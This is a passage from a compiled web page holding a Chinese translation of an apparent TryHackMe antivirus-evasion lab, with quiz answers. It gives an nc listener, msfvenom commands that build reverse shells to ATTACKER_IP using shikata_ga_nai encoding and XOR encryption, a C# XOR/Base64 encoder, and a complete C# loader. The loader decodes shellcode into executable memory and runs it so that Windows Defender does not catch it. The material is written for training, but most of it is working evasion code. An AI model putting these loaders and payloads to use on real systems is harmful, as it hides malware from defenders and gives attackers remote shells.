\u8bf7\u8bb0\u4f4f\u8bbe\u7f6e\u4e00\u4e2a nc \u76d1\u542c\u5668\uff0c\u4ee5\u5728\u8fd0\u884c msfvenom \u65f6\u6307\u5b9a\u7684\u76f8\u540c\u7aef\u53e3\u4e0a\u63a5\u6536\u53cd\u5411 shell\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="AttackBox"',children:"user@AttackBox$ nc -lvp 7474\n"})}),"\n",(0,d.jsxs)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:[(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5206\u9636\u6bb5 payload \u662f\u5426\u5728\u5355\u4e2a\u5305\u4e2d\u63d0\u4f9b\u6211\u4eec payload \u7684\u5b8c\u6574\u5185\u5bb9\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"nay\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsxs)("summary",{children:[" Metasploit payload ",(0,d.jsx)(n.code,{children:"windows/x64/meterpreter_reverse_https"})," \u662f\u5206\u9636\u6bb5 payload \u5417\uff1f (\u662f/\u5426) "]}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"nay\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5206\u9636\u6bb5 payload \u7684 stage0 \u662f\u5426\u8d1f\u8d23\u4e0b\u8f7d\u8981\u6267\u884c\u7684\u6700\u7ec8 payload\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"yea\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsxs)("summary",{children:[" \u6309\u7167\u8bf4\u660e\u521b\u5efa\u4e00\u4e2a\u5206\u9636\u6bb5 payload \u5e76\u5c06\u5176\u4e0a\u4f20\u5230 THM \u9632\u75c5\u6bd2\u68c0\u67e5\u7f51\u7ad9 ",(0,d.jsx)(n.code,{children:"http://MACHINE_IP/"})," "]}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})]}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a1-7-\u7f16\u7801\u548c\u52a0\u5bc6\u7b80\u4ecb",children:"\u4efb\u52a1 7 \u7f16\u7801\u548c\u52a0\u5bc6\u7b80\u4ecb"}),"\n",(0,d.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f\u7f16\u7801",children:"\u4ec0\u4e48\u662f\u7f16\u7801\uff1f"}),"\n",(0,d.jsx)(n.p,{children:"\u7f16\u7801\u662f\u6839\u636e\u7b97\u6cd5\u6216\u7f16\u7801\u7c7b\u578b\u5c06\u6570\u636e\u4ece\u5176\u539f\u59cb\u72b6\u6001\u8f6c\u6362\u4e3a\u7279\u5b9a\u683c\u5f0f\u7684\u8fc7\u7a0b\u3002 \u5b83\u53ef\u4ee5\u5e94\u7528\u4e8e\u8bb8\u591a\u6570\u636e\u7c7b\u578b\uff0c\u4f8b\u5982\u89c6\u9891\u3001HTML\u3001URL \u548c\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08EXE\u3001\u56fe\u50cf\u7b49\uff09\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u7f16\u7801\u662f\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u901a\u5e38\u7528\u4e8e\u5404\u79cd\u76ee\u7684\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u7a0b\u5e8f\u7f16\u8bd1\u548c\u6267\u884c"}),"\n",(0,d.jsx)(n.li,{children:"\u6570\u636e\u5b58\u50a8\u548c\u4f20\u8f93"}),"\n",(0,d.jsx)(n.li,{children:"\u6570\u636e\u5904\u7406\uff0c\u4f8b\u5982\u6587\u4ef6\u8f6c\u6362"}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:"\u540c\u6837\uff0c\u5728 AV \u89c4\u907f\u6280\u672f\u4e2d\uff0c\u7f16\u7801\u4e5f\u7528\u4e8e\u9690\u85cf\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684 shellcode \u5b57\u7b26\u4e32\u3002 \u7136\u800c\uff0c\u4ec5\u9760\u7f16\u7801\u4e0d\u8db3\u4ee5\u5b9e\u73b0\u89c4\u907f\u76ee\u7684\u3002 \u5982\u4eca\uff0cAV \u8f6f\u4ef6\u66f4\u52a0\u667a\u80fd\uff0c\u53ef\u4ee5\u5206\u6790\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e00\u65e6\u53d1\u73b0\u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\u4ee5\u68c0\u67e5\u6587\u672c\u7684\u539f\u59cb\u5f62\u5f0f\u3002"}),"\n",(0,d.jsx)(n.p,{children:'\u60a8\u8fd8\u53ef\u4ee5\u4e32\u8054\u4f7f\u7528\u4e24\u4e2a\u6216\u591a\u4e2a\u7f16\u7801\u7b97\u6cd5\uff0c\u4f7f AV \u66f4\u96be\u53d1\u73b0\u9690\u85cf\u5185\u5bb9\u3002 \u4e0b\u56fe\u663e\u793a\u6211\u4eec\u5c06 "THM" \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u8868\u793a\uff0c\u7136\u540e\u4f7f\u7528 Base64 \u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u60a8\u9700\u8981\u786e\u4fdd\u60a8\u7684\u6295\u653e\u5668\u73b0\u5728\u5904\u7406\u6b64\u7c7b\u7f16\u7801\u4ee5\u5c06\u5b57\u7b26\u4e32\u6062\u590d\u5230\u5176\u539f\u59cb\u72b6\u6001\u3002'}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u53cc\u91cd\u6587\u672c\u7f16\u7801\u6280\u672f",src:s(9394).A+"",width:"409",height:"220"})}),"\n",(0,d.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f\u52a0\u5bc6",children:"\u4ec0\u4e48\u662f\u52a0\u5bc6\uff1f"}),"\n",(0,d.jsx)(n.p,{children:"\u52a0\u5bc6\u662f\u4fe1\u606f\u548c\u6570\u636e\u5b89\u5168\u7684\u57fa\u672c\u8981\u7d20\u4e4b\u4e00\uff0c\u4fa7\u91cd\u4e8e\u9632\u6b62\u672a\u7ecf\u6388\u6743\u7684\u8bbf\u95ee\u548c\u6570\u636e\u64cd\u7eb5\u3002 \u52a0\u5bc6\u8fc7\u7a0b\u6d89\u53ca\u5c06\u660e\u6587\uff08\u672a\u52a0\u5bc6\u5185\u5bb9\uff09\u8f6c\u6362\u4e3a\u79f0\u4e3a\u5bc6\u6587\u7684\u52a0\u5bc6\u7248\u672c\u3002 \u4e0d\u77e5\u9053\u52a0\u5bc6\u4e2d\u4f7f\u7528\u7684\u7b97\u6cd5\u548c\u5bc6\u94a5\uff0c\u5c31\u65e0\u6cd5\u8bfb\u53d6\u6216\u89e3\u5bc6\u5bc6\u6587\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u4e0e\u7f16\u7801\u4e00\u6837\uff0c\u52a0\u5bc6\u6280\u672f\u7528\u4e8e\u5404\u79cd\u76ee\u7684\uff0c\u4f8b\u5982\u5b89\u5168\u5b58\u50a8\u548c\u4f20\u8f93\u6570\u636e\uff0c\u4ee5\u53ca\u7aef\u5230\u7aef\u52a0\u5bc6\u3002 \u52a0\u5bc6\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u4f7f\u7528\uff1a\u53cc\u65b9\u4e4b\u95f4\u5171\u4eab\u5bc6\u94a5\u6216\u4f7f\u7528\u516c\u94a5\u548c\u79c1\u94a5\u3002"}),"\n",(0,d.jsxs)(n.p,{children:["\u6709\u5173\u52a0\u5bc6\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u6211\u4eec\u9f13\u52b1\u60a8\u67e5\u770b ",(0,d.jsx)(n.a,{href:"https://tryhackme.com/room/encryptioncrypto101",children:"\u52a0\u5bc6 - Crypto 101"})," \u623f\u95f4\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u52a0\u5bc6\u548c\u89e3\u5bc6\u6982\u5ff5!",src:s(138).A+"",width:"878",height:"476"})}),"\n",(0,d.jsx)(n.h3,{id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6",children:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6\uff1f"}),"\n",(0,d.jsx)(n.p,{children:"AV \u4f9b\u5e94\u5546\u5b9e\u65bd\u5176 AV \u8f6f\u4ef6\uff0c\u4f7f\u7528\u9759\u6001\u6216\u52a8\u6001\u68c0\u6d4b\u6280\u672f\u5c06\u5927\u591a\u6570\u516c\u5171\u5de5\u5177\uff08\u5982 Metasploit \u7b49\uff09\u5217\u5165\u963b\u6b62\u5217\u8868\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u4e0d\u4fee\u6539\u8fd9\u4e9b\u516c\u5171\u5de5\u5177\u751f\u6210\u7684 shellcode\uff0c\u60a8\u7684\u6295\u653e\u5668\u7684\u68c0\u6d4b\u7387\u4f1a\u5f88\u9ad8\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u7f16\u7801\u548c\u52a0\u5bc6\u53ef\u7528\u4e8e AV \u89c4\u907f\u6280\u672f\uff0c\u6211\u4eec\u5728\u5176\u4e2d\u5bf9\u6295\u653e\u5668\u4e2d\u4f7f\u7528\u7684 shellcode \u8fdb\u884c\u7f16\u7801\u548c/\u6216\u52a0\u5bc6\uff0c\u4ee5\u5728\u8fd0\u884c\u65f6\u5c06\u5176\u9690\u85cf\u8d77\u6765\uff0c\u907f\u514d\u88ab AV \u8f6f\u4ef6\u53d1\u73b0\u3002 \u6b64\u5916\uff0c\u8fd9\u4e24\u79cd\u6280\u672f\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u9690\u85cf shellcode\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u9690\u85cf\u51fd\u6570\u3001\u53d8\u91cf\u7b49\u3002 \u5728\u672c\u623f\u95f4\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u52a0\u5bc6 shellcode \u4ee5\u89c4\u907f Windows Defender\u3002"}),"\n",(0,d.jsxs)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:[(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u4ec5\u7f16\u7801 shellcode \u662f\u5426\u8db3\u4ee5\u89c4\u907f\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"nay\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u7f16\u7801\u6280\u672f\u662f\u5426\u4f7f\u7528\u5bc6\u94a5\u6765\u7f16\u7801\u5b57\u7b26\u4e32\u6216\u6587\u4ef6\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"nay\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u52a0\u5bc6\u7b97\u6cd5\u662f\u5426\u4f7f\u7528\u5bc6\u94a5\u6765\u52a0\u5bc6\u5b57\u7b26\u4e32\u6216\u6587\u4ef6\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"yea\n"})})]})]}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a1-8-shellcode-\u7f16\u7801\u548c\u52a0\u5bc6",children:"\u4efb\u52a1 8 Shellcode \u7f16\u7801\u548c\u52a0\u5bc6"}),"\n",(0,d.jsx)(n.h3,{id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u7f16\u7801",children:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u7f16\u7801"}),"\n",(0,d.jsx)(n.p,{children:"\u516c\u5171\u5de5\u5177\uff08\u5982 Metasploit\uff09\u63d0\u4f9b\u7f16\u7801\u548c\u52a0\u5bc6\u529f\u80fd\u3002 \u7136\u800c\uff0cAV \u4f9b\u5e94\u5546\u4e86\u89e3\u8fd9\u4e9b\u5de5\u5177\u6784\u5efa\u5176 payload \u7684\u65b9\u5f0f\uff0c\u5e76\u91c7\u53d6\u63aa\u65bd\u68c0\u6d4b\u5b83\u4eec\u3002 \u5982\u679c\u60a8\u5c1d\u8bd5\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e9b\u529f\u80fd\uff0c\u60a8\u7684 payload \u5f88\u53ef\u80fd\u5728\u6587\u4ef6\u89e6\u53ca\u53d7\u5bb3\u8005\u7684\u78c1\u76d8\u65f6\u5c31\u88ab\u68c0\u6d4b\u5230\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u7528\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u7b80\u5355\u7684 payload \u6765\u8bc1\u660e\u8fd9\u4e00\u70b9\u3002 \u9996\u5148\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5217\u51fa msfvenom \u53ef\u7528\u7684\u6240\u6709\u7f16\u7801\u5668\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Listing Encoders within the Metasploit Framework"',children:"user@AttackBox$ msfvenom --list encoders | grep excellent\n    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder\n    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"-e"}),"\uff08\u7f16\u7801\u5668\uff09\u5f00\u5173\u6307\u793a\u6211\u4eec\u60f3\u8981\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"shikata_ga_nai"})," \u7f16\u7801\u5668\uff0c\u7136\u540e\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"-i"}),"\uff08\u8fed\u4ee3\u6b21\u6570\uff09\u5f00\u5173\u6307\u5b9a\u6211\u4eec\u60f3\u8981\u5bf9 payload \u8fdb\u884c\u4e09\u6b21\u7f16\u7801\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Encoding using the Metasploit Framework (Shikata_ga_nai)"',children:"user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\\x00' -i 3 -f csharp\nFound 1 compatible encoders\nAttempting to encode payload with 3 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 368 (iteration=0)\nx86/shikata_ga_nai succeeded with size 395 (iteration=1)\nx86/shikata_ga_nai succeeded with size 422 (iteration=2)\nx86/shikata_ga_nai chosen with final size 422\nPayload size: 422 bytes\nFinal size of csharp file: 2170 bytes\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u5c06\u65b0\u751f\u6210\u7684 payload \u4e0a\u4f20\u5230\u6211\u4eec\u7684\u6d4b\u8bd5\u673a\u5668\uff0cAV \u4f1a\u5728\u6211\u4eec\u6709\u673a\u4f1a\u6267\u884c\u5b83\u4e4b\u524d\u7acb\u5373\u6807\u8bb0\u5b83\uff1a"}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"Windows Defender \u68c0\u6d4b\u5230\u6211\u4eec\u7684 payload \u4e3a\u6076\u610f\u8f6f\u4ef6!",src:s(8558).A+"",width:"811",height:"439"})}),"\n",(0,d.jsx)(n.p,{children:"\u5982\u679c\u7f16\u7801\u4e0d\u8d77\u4f5c\u7528\uff0c\u6211\u4eec\u603b\u662f\u53ef\u4ee5\u5c1d\u8bd5\u52a0\u5bc6 payload\u3002 \u76f4\u89c2\u4e0a\uff0c\u6211\u4eec\u9884\u8ba1\u8fd9\u4f1a\u5177\u6709\u66f4\u9ad8\u7684\u6210\u529f\u7387\uff0c\u56e0\u4e3a\u89e3\u5bc6 payload \u5bf9 AV \u6765\u8bf4\u5e94\u8be5\u662f\u4e00\u9879\u66f4\u56f0\u96be\u7684\u4efb\u52a1\u3002 \u8ba9\u6211\u4eec\u73b0\u5728\u5c1d\u8bd5\u4e00\u4e0b\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u52a0\u5bc6",children:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u52a0\u5bc6"}),"\n",(0,d.jsx)(n.p,{children:"\u60a8\u53ef\u4ee5\u4f7f\u7528 msfvenom \u8f7b\u677e\u751f\u6210\u52a0\u5bc6\u7684 payload\u3002 \u7136\u800c\uff0c\u52a0\u5bc6\u7b97\u6cd5\u7684\u9009\u62e9\u6709\u4e9b\u6709\u9650\u3002 \u8981\u5217\u51fa\u53ef\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Listing encryption modules within the Metasploit Framework"',children:"user@AttackBox$ msfvenom --list encrypt\nFramework Encryption Formats [--encrypt <value>]\n================================================\n\n    Name\n    ----\n    aes256\n    base64\n    rc4\n    xor\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u6784\u5efa\u4e00\u4e2a XOR \u52a0\u5bc6\u7684 payload\u3002 \u5bf9\u4e8e\u8fd9\u79cd\u7c7b\u578b\u7684\u7b97\u6cd5\uff0c\u60a8\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u5bc6\u94a5\u3002 \u547d\u4ee4\u5c06\u5982\u4e0b\u6240\u793a\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Xoring Shellcode using the Metasploit Framework"',children:'user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: xored-revshell.exe\n'})}),"\n",(0,d.jsxs)(n.p,{children:["\u518d\u6b21\u5f3a\u8c03\uff0c\u5982\u679c\u6211\u4eec\u5c06\u751f\u6210\u7684 shell \u4e0a\u4f20\u5230 THM \u9632\u75c5\u6bd2\u68c0\u67e5\uff01 \u9875\u9762\u4f4d\u4e8e ",(0,d.jsx)(n.code,{children:"http://MACHINE_IP/"}),"\uff0c\u5b83\u4ecd\u7136\u4f1a\u88ab\u9632\u75c5\u6bd2\u8f6f\u4ef6\u6807\u8bb0\u3002 \u539f\u56e0\u4ecd\u7136\u662f\u9632\u75c5\u6bd2\u4f9b\u5e94\u5546\u6295\u5165\u4e86\u5927\u91cf\u65f6\u95f4\u6765\u786e\u4fdd\u68c0\u6d4b\u5230\u7b80\u5355\u7684 msfvenom payload\u3002"]}),"\n",(0,d.jsx)(n.h3,{id:"\u521b\u5efa\u81ea\u5b9a\u4e49-payload",children:"\u521b\u5efa\u81ea\u5b9a\u4e49 payload"}),"\n",(0,d.jsx)(n.p,{children:"\u514b\u670d\u8fd9\u4e2a\u95ee\u9898\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u4f7f\u7528\u6211\u4eec\u81ea\u5df1\u7684\u81ea\u5b9a\u4e49\u7f16\u7801\u65b9\u6848\uff0c\u8fd9\u6837\u9632\u75c5\u6bd2\u8f6f\u4ef6\u5c31\u4e0d\u77e5\u9053\u5982\u4f55\u5206\u6790\u6211\u4eec\u7684 payload\u3002 \u8bf7\u6ce8\u610f\uff0c\u60a8\u4e0d\u5fc5\u505a\u4efb\u4f55\u592a\u590d\u6742\u7684\u4e8b\u60c5\uff0c\u53ea\u8981\u5b83\u8db3\u591f\u8ba9\u9632\u75c5\u6bd2\u8f6f\u4ef6\u5206\u6790\u65f6\u611f\u5230\u56f0\u60d1\u5373\u53ef\u3002 \u5bf9\u4e8e\u6b64\u4efb\u52a1\uff0c\u6211\u4eec\u5c06\u91c7\u7528 msfvenom \u751f\u6210\u7684\u7b80\u5355\u53cd\u5411 shell\uff0c\u5e76\u4f7f\u7528 XOR \u548c Base64 \u7684\u7ec4\u5408\u6765\u7ed5\u8fc7 Defender\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u9996\u5148\u4ee5 CSharp \u683c\u5f0f\u4f7f\u7528 msfvenom \u751f\u6210\u4e00\u4e2a\u53cd\u5411 shell\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Generate a CSharp shellcode Format"',children:"user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp\n"})}),"\n",(0,d.jsx)(n.h3,{id:"\u7f16\u7801\u5668",children:"\u7f16\u7801\u5668"}),"\n",(0,d.jsxs)(n.p,{children:["\u5728\u6784\u5efa\u5b9e\u9645\u6709\u6548\u8f7d\u8377\u4e4b\u524d\uff0c\u6211\u4eec\u5c06\u521b\u5efa\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u8be5\u7a0b\u5e8f\u5c06\u83b7\u53d6msfvenom\u751f\u6210\u7684shellcode\uff0c\u5e76\u4ee5\u6211\u4eec\u559c\u6b22\u7684\u4efb\u4f55\u65b9\u5f0f\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c06\u9996\u5148\u4f7f\u7528\u81ea\u5b9a\u4e49\u5bc6\u94a5\u5bf9\u6709\u6548\u8f7d\u8377\u8fdb\u884cXOR\u8fd0\u7b97\uff0c\u7136\u540e\u4f7f\u7528base64\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u3002 \u4ee5\u4e0b\u662f\u7f16\u7801\u5668\u7684\u5b8c\u6574\u4ee3\u7801\uff08\u60a8\u4e5f\u53ef\u4ee5\u5728Windows\u673a\u5668\u7684",(0,d.jsx)(n.code,{children:"C:\\Tools\\CS Files\\Encryptor.cs"}),"\u4e2d\u627e\u5230\u6b64\u4ee3\u7801\uff09\uff1a"]}),"\n",(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5b8c\u6574\u6709\u6548\u8f7d\u8377\u4ee3\u7801\uff08\u70b9\u51fb\u9605\u8bfb\uff09 "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace Encrypter\n{\n    internal class Program\n    {\n        private static byte[] xor(byte[] shell, byte[] KeyBytes)\n        {\n            for (int i = 0; i < shell.Length; i++)\n            {\n                shell[i] ^= KeyBytes[i % KeyBytes.Length];\n            }\n            return shell;\n        }\n        static void Main(string[] args)\n        {\n            //XOR Key - It has to be the same in the Droppr for Decrypting\n            string key = "THMK3y123!";\n\n            //Convert Key into bytes\n            byte[] keyBytes = Encoding.ASCII.GetBytes(key);\n\n            //Original Shellcode here (csharp format)\n            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };\n\n            //XORing byte by byte and saving into a new array of bytes\n            byte[] encoded = xor(buf, keyBytes);\n            Console.WriteLine(Convert.ToBase64String(encoded));        \n        }\n    }\n}\n'})})]}),"\n",(0,d.jsx)(n.p,{children:"\u4ee3\u7801\u975e\u5e38\u7b80\u5355\u660e\u4e86\uff0c\u5c06\u751f\u6210\u4e00\u4e2a\u7f16\u7801\u7684\u6709\u6548\u8f7d\u8377\uff0c\u6211\u4eec\u5c06\u5c06\u5176\u5d4c\u5165\u5230\u6700\u7ec8\u6709\u6548\u8f7d\u8377\u4e2d\u3002 \u8bf7\u8bb0\u4f4f\u5c06buf\u53d8\u91cf\u66ff\u6362\u4e3a\u60a8\u4f7f\u7528msfvenom\u751f\u6210\u7684shellcode\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u8981\u7f16\u8bd1\u548c\u6267\u884c\u7f16\u7801\u5668\uff0c\u6211\u4eec\u53ef\u4ee5\u5728Windows\u673a\u5668\u4e0a\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Compiling and running our custom CSharp encoder"',children:"C:\\> csc.exe Encrypter.cs\nC:\\> .\\Encrypter.exe\nqKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=\n"})}),"\n",(0,d.jsx)(n.h3,{id:"\u81ea\u89e3\u7801\u6709\u6548\u8f7d\u8377",children:"\u81ea\u89e3\u7801\u6709\u6548\u8f7d\u8377"}),"\n",(0,d.jsxs)(n.p,{children:["\u7531\u4e8e\u6211\u4eec\u6709\u4e00\u4e2a\u7f16\u7801\u7684\u6709\u6548\u8f7d\u8377\uff0c\u6211\u4eec\u9700\u8981\u8c03\u6574\u6211\u4eec\u7684\u4ee3\u7801\uff0c\u4ee5\u4fbf\u5728\u6267\u884c\u4e4b\u524d\u89e3\u7801shellcode\u3002 \u4e3a\u4e86\u5339\u914d\u7f16\u7801\u5668\uff0c\u6211\u4eec\u5c06\u4ee5\u4e0e\u7f16\u7801\u76f8\u53cd\u7684\u987a\u5e8f\u89e3\u7801\u6240\u6709\u5185\u5bb9\uff0c\u56e0\u6b64\u6211\u4eec\u9996\u5148\u89e3\u7801base64\u5185\u5bb9\uff0c\u7136\u540e\u4f7f\u7528\u4e0e\u7f16\u7801\u5668\u4e2d\u76f8\u540c\u7684\u5bc6\u94a5\u5bf9\u7ed3\u679c\u8fdb\u884cXOR\u8fd0\u7b97\u3002 \u4ee5\u4e0b\u662f\u5b8c\u6574\u6709\u6548\u8f7d\u8377\u4ee3\u7801\uff08\u60a8\u4e5f\u53ef\u4ee5\u5728Windows\u673a\u5668\u7684",(0,d.jsx)(n.code,{children:"C:\\Tools\\CS Files\\EncStageless.cs"}),"\u4e2d\u83b7\u53d6\uff09\uff1a"]}),"\n",(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5b8c\u6574\u6709\u6548\u8f7d\u8377\u4ee3\u7801\uff08\u70b9\u51fb\u9605\u8bfb\uff09 "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Net;\nusing System.Text;\nusing System.Runtime.InteropServices;\n\npublic class Program {\n  [DllImport("kernel32")]\n  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n  [DllImport("kernel32")]\n  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\n  [DllImport("kernel32")]\n  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n  private static UInt32 MEM_COMMIT = 0x1000;\n  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n  \n  private static byte[] xor(byte[] shell, byte[] KeyBytes)\n        {\n            for (int i = 0; i < shell.Length; i++)\n            {\n                shell[i] ^= KeyBytes[i % KeyBytes.Length];\n            }\n            return shell;\n        }\n  public static void Main()\n  {\n\n    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";\n    byte[] data = Convert.FromBase64String(dataBS64);\n\n    string key = "THMK3y123!";\n    //Convert Key into bytes\n    byte[] keyBytes = Encoding.ASCII.GetBytes(key);\n\n    byte[] encoded = xor(data, keyBytes);\n\n    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);\n\n    IntPtr threadHandle = IntPtr.Zero;\n    UInt32 threadId = 0;\n    IntPtr parameter = IntPtr.Zero;\n    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\n\n    WaitForSingleObject(threadHandle, 0xFFFFFFFF);\n\n  }\n}\n'})})]}),"\n",(0,d.jsx)(n.p,{children:"\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u4ec5\u4ec5\u7ed3\u5408\u4e86\u51e0\u4e2a\u5728\u5355\u72ec\u4f7f\u7528\u65f6\u88ab\u68c0\u6d4b\u5230\u7684\u975e\u5e38\u7b80\u5355\u6280\u672f\u3002 